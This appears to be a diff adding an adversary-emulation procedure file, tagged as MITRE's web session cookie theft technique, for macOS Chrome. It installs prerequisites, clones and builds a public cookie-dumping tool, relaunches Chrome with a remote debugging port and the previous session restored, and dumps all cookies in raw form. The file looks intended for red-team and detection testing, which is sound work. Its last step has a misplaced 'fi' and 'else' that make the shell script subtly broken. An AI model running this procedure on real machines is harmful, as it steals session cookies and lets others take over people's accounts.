@@ -1,0 +1,106 @@
+---
+api_version: 2.0
+uuid: 2cd87e28-d207-4cc2-9b61-644e32aeba61
+name: extract-cookies-from-chromium-browser
+description: Runs chromium-based browsers in debugger port and extracts cookies
+requirements:
+  platforms:
+    - os: darwin
+  superuser: false
+mitre:
+  tactics:
+    - TA0006 Credential Access
+  techniques:
+    - T1539 Steal Web Session Cookie
+steps:
+  - name: setup
+    inline: |
+      # Determine the operating system
+      OS=$(uname)
+      if [[ "$OS" == "Darwin" ]]; then
+
+        # Confirm that brew package manager is installed
+        if ! command -v brew &> /dev/null; then
+          echo "===> Error: Brew package manager is not installed on the current system. Please install to proceed."
+          exit 1
+        else
+          echo "===> Confirmed: Brew is installed."
+
+          # Confirm that golang utility is installed. If not, install it.
+          if ! command -v go &> /dev/null; then
+            echo "===> Error: Golang is not installed on the current system. Installing now."
+            brew install golang
+            if [ $? -ne 0 ]; then
+              echo "===> Error: Failed to install Golang."
+              exit 1
+            fi
+          else
+            echo "===> Confirmed: Golang is installed."
+          fi
+
+          # Confirm that Google Chrome is installed
+          if [ -d "/Applications/Google Chrome.app" ]; then
+            echo "===> Confirmed: Google Chrome is installed."
+          else
+            echo "===> Error: Goolge Chrome is not installed on the current system. Installing now."
+            brew install --cask google-chrome
+            if [ $? -ne 0 ]; then
+              echo "===> Error: Failed to install Google Chrome."
+              exit 1
+            fi
+          fi
+        fi
+      else
+        echo "Unsupported operating system."
+        exit 27
+      fi
+  - name: clone-whitecocolatemacademianut
+    inline: |
+      git clone https://github.com/slyd0g/WhiteChocolateMacademiaNut
+      cd WhiteChocolateMacademiaNut
+      git checkout b024f72f6350fb62853f06052a8431d20e76db7a
+    cleanup:
+      inline: |
+        echo "Removing WhiteChocolateMacademiaNut git repository"
+        rm -rf WhiteChocolateMacademiaNut
+
+  - name: build-whitecocolatemacademianut
+    inline: |
+      cd WhiteChocolateMacademiaNut
+      go mod init github.com/slyd0g/WhiteChocolateMacademiaNut
+      go get github.com/akamensky/argparse
+      go get golang.org/x/net/websocket
+      go build -o WhiteChocolateMacademiaNut
+
+  - name: run-whitecocolatemacademianut
+    inline: |
+      # Determine the operating system
+      OS=$(uname)
+      if [[ "$OS" == "Darwin" ]]; then
+        # Open Chrome 
+        open -a "Google Chrome" "https://www.google.com" &
+        sleep 5
+
+        # Kill Chrome Process
+        killall "Google Chrome" 
+
+        # Open Chrome with remote debugger port
+        "/Applications/Google Chrome.app/Contents/MacOS/Google Chrome" --remote-debugging-port=9222 --restore-last-session --remote-allow-origins=http://localhost/ &
+        sleep 5
+
+        cd WhiteChocolateMacademiaNut
+        ./WhiteChocolateMacademiaNut --port 9222 --dump cookies --format raw
+        if [ $? -ne 0 ]; then
+          echo "Failed to run WhiteChocolateMacademiaNut."
+          killall "Google Chrome" 
+          exit 1
+        else
+          echo "TTP Ran Successfully"
+          killall "Google Chrome" 
+          exit 0
+        fi
+      fi
+      else
+        echo "Unsupported operating system."
+        exit 27
+      fi
